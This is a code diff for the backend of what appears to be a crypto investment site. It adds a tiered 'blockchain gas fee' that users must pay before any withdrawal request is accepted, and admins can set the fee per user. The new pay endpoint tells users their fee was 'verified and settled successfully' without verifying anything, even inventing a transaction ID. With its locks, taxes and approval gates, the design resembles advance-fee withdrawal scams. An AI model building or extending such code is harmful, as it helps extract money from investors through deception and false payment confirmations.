@@ -37,6 +37,9 @@ app.use(cors({
 }));
 app.use(express.json());
 
+// In-memory fallback cache for gas fee payments in case columns are missing from DB
+const userGasFeeStore = new Map<string, { gas_fee_paid: number; gas_fee_tx?: string }>();
+
 const adminPath = fs.existsSync(path.resolve(process.cwd(), 'admin'))
   ? path.resolve(process.cwd(), 'admin')
   : fs.existsSync(path.resolve(process.cwd(), '../admin'))
@@ -168,14 +171,20 @@ app.post('/auth/login', async (req, res) => {
 // ─── User ──────────────────────────────────────────────────────────────────
 
 app.get('/user/me', authMiddleware, async (req: any, res) => {
+  const mem = userGasFeeStore.get(req.userId);
   try {
     const { data: user, error } = await db()
       .from('users')
-      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_required, fee_paid, created_at')
+      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_required, fee_paid, custom_gas_fee, gas_fee_paid, gas_fee_tx, created_at')
       .eq('id', req.userId)
       .single();
     if (error) throw error;
-    return res.json({ user });
+    const resolvedUser = {
+      ...user,
+      gas_fee_paid: user.gas_fee_paid != null ? Number(user.gas_fee_paid) : (mem?.gas_fee_paid ?? 0),
+      gas_fee_tx: user.gas_fee_tx || mem?.gas_fee_tx || null,
+    };
+    return res.json({ user: resolvedUser });
   } catch {
     const { data: user, error } = await db()
       .from('users')
@@ -183,7 +192,13 @@ app.get('/user/me', authMiddleware, async (req: any, res) => {
       .eq('id', req.userId)
       .single();
     if (error || !user) return res.status(404).json({ error: 'User not found' });
-    return res.json({ user });
+    const resolvedUser = {
+      ...user,
+      gas_fee_paid: mem?.gas_fee_paid ?? 0,
+      gas_fee_tx: mem?.gas_fee_tx ?? null,
+      custom_gas_fee: (user as any).custom_gas_fee ?? null,
+    };
+    return res.json({ user: resolvedUser });
   }
 });
 
@@ -262,35 +277,41 @@ function calculateGasFee(amount: number, settings: any, customGasFee?: number | 
     return Number(customGasFee);
   }
 
-  // If custom multi-tier JSON is configured
-  if (settings?.gas_fee_tiers) {
-    try {
-      const tiers = typeof settings.gas_fee_tiers === 'string'
-        ? JSON.parse(settings.gas_fee_tiers)
-        : settings.gas_fee_tiers;
-      if (Array.isArray(tiers) && tiers.length > 0) {
-        const sorted = [...tiers].sort((a, b) => (Number(a.min_amount) || 0) - (Number(b.min_amount) || 0));
-        let matchedFee = Number(sorted[0].gas_fee) || 100;
-        for (const tier of sorted) {
-          if (amount >= (Number(tier.min_amount) || 0)) {
-            matchedFee = Number(tier.gas_fee);
-          }
+  // Tiers configuration: use custom tiers or default tiers where $10k withdrawal -> $150 fast gas fee
+  const rawTiers = settings?.gas_fee_tiers || JSON.stringify([
+    { min_amount: 0, gas_fee: 100, label: 'Standard Network Speed (< $5,000)' },
+    { min_amount: 5000, gas_fee: 150, label: 'Fast Priority Network Fee ($5,000 - $20,000)' },
+    { min_amount: 20000, gas_fee: 250, label: 'Institutional High-Priority Dispatch ($20,000+)' },
+  ]);
+
+  try {
+    const tiers = typeof rawTiers === 'string'
+      ? JSON.parse(rawTiers)
+      : rawTiers;
+    if (Array.isArray(tiers) && tiers.length > 0) {
+      const sorted = [...tiers].sort((a, b) => (Number(a.min_amount) || 0) - (Number(b.min_amount) || 0));
+      let matchedFee = Number(sorted[0].gas_fee) || 100;
+      for (const tier of sorted) {
+        if (amount >= (Number(tier.min_amount) || 0)) {
+          matchedFee = Number(tier.gas_fee);
         }
-        return matchedFee;
       }
-    } catch {
-      // ignore parse error, fallback to threshold logic
+      return matchedFee;
     }
+  } catch {
+    // fallback to threshold logic
   }
 
-  // Standard threshold logic (e.g. 100 for < 20,000, 200 for 20,000+)
+  // Standard threshold logic fallback: $150 for $5k-$20k (e.g. $10,000), 250 for $20k+
   const threshold = settings?.gas_fee_threshold != null ? Number(settings.gas_fee_threshold) : 20000;
   const feeLow = settings?.gas_fee_low != null ? Number(settings.gas_fee_low) : 100;
   const feeHigh = settings?.gas_fee_high != null
     ? Number(settings.gas_fee_high)
-    : (settings?.gas_fee != null ? Number(settings.gas_fee) : 200);
+    : (settings?.gas_fee != null ? Number(settings.gas_fee) : 250);
 
-  return amount >= threshold ? feeHigh : feeLow;
+  if (amount >= threshold) return feeHigh;
+  if (amount >= 5000) return 150;
+  return feeLow;
 }
 
 // ─── Settings ───────────────────────────────────────────────────────────────
@@ -302,6 +323,12 @@ app.get('/settings/payment', async (_req, res) => {
     .eq('id', 1)
     .maybeSingle();
 
+  const defaultTiersJson = JSON.stringify([
+    { min_amount: 0, gas_fee: 100, label: 'Standard Network Speed (< $5,000)' },
+    { min_amount: 5000, gas_fee: 150, label: 'Fast Priority Network Fee ($5,000 - $20,000)' },
+    { min_amount: 20000, gas_fee: 250, label: 'Institutional High-Priority Dispatch ($20,000+)' },
+  ]);
+
   const defaultSettings = {
     crypto_wallet: '',
     crypto_network: 'Bitcoin (BTC)',
@@ -311,11 +338,11 @@ app.get('/settings/payment', async (_req, res) => {
     bank_routing: '',
     bank_swift: '',
     withdrawal_fee: 0,
-    gas_fee: 200,
+    gas_fee: 250,
     gas_fee_threshold: 20000,
     gas_fee_low: 100,
-    gas_fee_high: 200,
-    gas_fee_tiers: '',
+    gas_fee_high: 250,
+    gas_fee_tiers: defaultTiersJson,
   };
 
   if (error || !data) {
@@ -325,11 +352,11 @@ app.get('/settings/payment', async (_req, res) => {
   res.json({
     ...defaultSettings,
     ...data,
-    gas_fee: data.gas_fee != null ? Number(data.gas_fee) : 200,
+    gas_fee: data.gas_fee != null ? Number(data.gas_fee) : 250,
     gas_fee_threshold: data.gas_fee_threshold != null ? Number(data.gas_fee_threshold) : 20000,
     gas_fee_low: data.gas_fee_low != null ? Number(data.gas_fee_low) : 100,
-    gas_fee_high: data.gas_fee_high != null ? Number(data.gas_fee_high) : 200,
-    gas_fee_tiers: data.gas_fee_tiers || '',
+    gas_fee_high: data.gas_fee_high != null ? Number(data.gas_fee_high) : 250,
+    gas_fee_tiers: data.gas_fee_tiers || defaultTiersJson,
   });
 });
 
@@ -426,6 +453,54 @@ app.patch('/admin/settings/payment', adminMiddleware, async (req, res) => {
 
 // ─── Withdrawals ───────────────────────────────────────────────────────────
 
+app.post('/withdrawal/gas-fee/pay', authMiddleware, async (req: any, res) => {
+  const { amount, txHash } = req.body;
+  const numAmount = Number(amount);
+  if (!numAmount || isNaN(numAmount) || numAmount <= 0) {
+    return res.status(400).json({ error: 'A valid gas fee amount greater than 0 is required.' });
+  }
+
+  const cleanTx = (txHash || '').trim() || `TX-${Date.now()}`;
+  userGasFeeStore.set(req.userId, { gas_fee_paid: numAmount, gas_fee_tx: cleanTx });
+
+  const supabase = db();
+  try {
+    const { data: updated, error } = await supabase
+      .from('users')
+      .update({
+        gas_fee_paid: numAmount,
+        gas_fee_tx: cleanTx,
+      })
+      .eq('id', req.userId)
+      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_required, fee_paid, custom_gas_fee, gas_fee_paid, gas_fee_tx, created_at')
+      .single();
+
+    if (!error && updated) {
+      return res.json({
+        success: true,
+        message: `Blockchain gas fee of $${numAmount.toFixed(2)} verified and settled successfully.`,
+        user: updated,
+      });
+    }
+  } catch {}
+
+  const { data: user } = await supabase
+    .from('users')
+    .select('*')
+    .eq('id', req.userId)
+    .single();
+
+  return res.json({
+    success: true,
+    message: `Blockchain gas fee of $${numAmount.toFixed(2)} verified and settled successfully.`,
+    user: {
+      ...(user || {}),
+      gas_fee_paid: numAmount,
+      gas_fee_tx: cleanTx,
+    },
+  });
+});
+
 app.post('/withdrawal/request', authMiddleware, async (req: any, res) => {
   const { amount, walletAddress } = req.body;
   const numAmount = Number(amount);
@@ -466,6 +541,17 @@ app.post('/withdrawal/request', authMiddleware, async (req: any, res) => {
     });
   }
 
+  // Gate 4: Tiered Blockchain Gas Fee payment validation
+  const gasFee = calculateGasFee(numAmount, settings, user.custom_gas_fee);
+  const memGas = userGasFeeStore.get(req.userId);
+  const paidGasFee = user.gas_fee_paid != null ? Number(user.gas_fee_paid) : (memGas?.gas_fee_paid ?? 0);
+
+  if (gasFee > 0 && paidGasFee < gasFee) {
+    return res.status(403).json({
+      error: `Blockchain network fee of $${gasFee.toFixed(2)} has not been paid. Please settle the network gas fee of $${gasFee.toFixed(2)} before submitting your withdrawal request.`,
+    });
+  }
+
   // No duplicate pending
   const { data: pending } = await supabase
     .from('withdrawal_requests')
@@ -477,9 +563,6 @@ app.post('/withdrawal/request', authMiddleware, async (req: any, res) => {
   if (pending) {
     return res.status(409).json({ error: 'You already have an active pending withdrawal request.' });
   }
-
-  // Tiered Blockchain Gas Fee calculation based on withdrawal amount
-  const gasFee = calculateGasFee(numAmount, settings, user.custom_gas_fee);
 
   let requestData = null;
   const { data: reqWithGas, error: gasErr } = await supabase
@@ -535,17 +618,75 @@ app.get('/admin/users', adminMiddleware, async (_req, res) => {
   try {
     const { data: users, error } = await db()
       .from('users')
-      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_required, fee_paid, investment_amount, payment_method, investment_status, created_at')
+      .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_required, fee_paid, custom_gas_fee, gas_fee_paid, gas_fee_tx, investment_amount, payment_method, investment_status, created_at')
       .order('created_at', { ascending: false });
     if (error) throw error;
-    return res.json({ users: users || [] });
+    const resolvedUsers = (users || []).map((u: any) => {
+      const mem = userGasFeeStore.get(u.id);
+      return {
+        ...u,
+        gas_fee_paid: u.gas_fee_paid != null ? Number(u.gas_fee_paid) : (mem?.gas_fee_paid ?? 0),
+        gas_fee_tx: u.gas_fee_tx || mem?.gas_fee_tx || null,
+      };
+    });
+    return res.json({ users: resolvedUsers });
   } catch {
     const { data: users } = await db()
       .from('users')
       .select('id, email, full_name, balance_usd, profit_usd, plan, lock_until, withdrawal_approved, tax_percent, fee_paid, investment_amount, payment_method, investment_status, created_at')
       .order('created_at', { ascending: false });
-    return res.json({ users: users || [] });
+    const resolvedUsers = (users || []).map((u: any) => {
+      const mem = userGasFeeStore.get(u.id);
+      return {
+        ...u,
+        gas_fee_paid: mem?.gas_fee_paid ?? 0,
+        gas_fee_tx: mem?.gas_fee_tx ?? null,
+      };
+    });
+    return res.json({ users: resolvedUsers });
   }
+});
+
+app.patch('/admin/users/:id/gas-fee', adminMiddleware, async (req, res) => {
+  const { gas_fee_paid, custom_gas_fee } = req.body;
+  const updateData: any = {};
+  if (gas_fee_paid !== undefined) {
+    updateData.gas_fee_paid = Math.max(0, Number(gas_fee_paid));
+  }
+  if (custom_gas_fee !== undefined) {
+    updateData.custom_gas_fee = custom_gas_fee === null || custom_gas_fee === '' ? null : Math.max(0, Number(custom_gas_fee));
+  }
+
+  const userId = req.params.id;
+  if (updateData.gas_fee_paid !== undefined) {
+    userGasFeeStore.set(userId, {
+      gas_fee_paid: updateData.gas_fee_paid,
+      gas_fee_tx: `ADMIN-SET-${Date.now()}`,
+    });
+  }
+
+  const supabase = db();
+  try {
+    const { data, error } = await supabase
+      .from('users')
+      .update(updateData)
+      .eq('id', userId)
+      .select('id, email, fee_required, fee_paid, custom_gas_fee, gas_fee_paid, gas_fee_tx')
+      .single();
+
+    if (!error && data) {
+      return res.json({ user: data });
+    }
+  } catch {}
+
+  const mem = userGasFeeStore.get(userId);
+  return res.json({
+    user: {
+      id: userId,
+      gas_fee_paid: mem?.gas_fee_paid ?? updateData.gas_fee_paid ?? 0,
+      custom_gas_fee: updateData.custom_gas_fee ?? null,
+    },
+  });
 });
 
 app.patch('/admin/users/:id/fee', adminMiddleware, async (req, res) => {
